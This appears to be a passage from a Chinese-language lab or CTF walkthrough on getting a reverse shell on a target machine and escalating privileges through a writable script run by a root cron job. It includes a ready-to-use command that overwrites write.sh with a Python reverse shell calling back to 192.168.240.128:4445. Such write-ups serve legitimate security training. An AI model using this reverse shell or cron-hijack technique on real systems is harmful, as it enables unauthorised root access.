**~~/bin/bash 无法回弹~~**

**~~nc 无法回弹~~**


**python3 回弹成功**

`目标靶机没有python 有python3`

```python

```

## 提权

**信息枚举**

内核版本较高，存在定时任务

每5分钟执行 `finally.sh` 为 root 权限，`finally.sh` 内容为执行 `write.sh` ,www-data 对其具有 777 权限，所以我们可以更改脚本内容提权

![Pasted image 20250730125353.png](/assets/img/attachments/Pasted%20image%2020250730125353.png)

### 定时任务提权


**使用 ’cat << "EOF"‘ 覆盖写入python脚本**

```python

cat << 'EOF' > /var/www/html/write.sh
#!/bin/sh
python3 - << 'PYCODE'
import socket, os, subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.240.128", 4445))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash", "-i"])
PYCODE
EOF

```
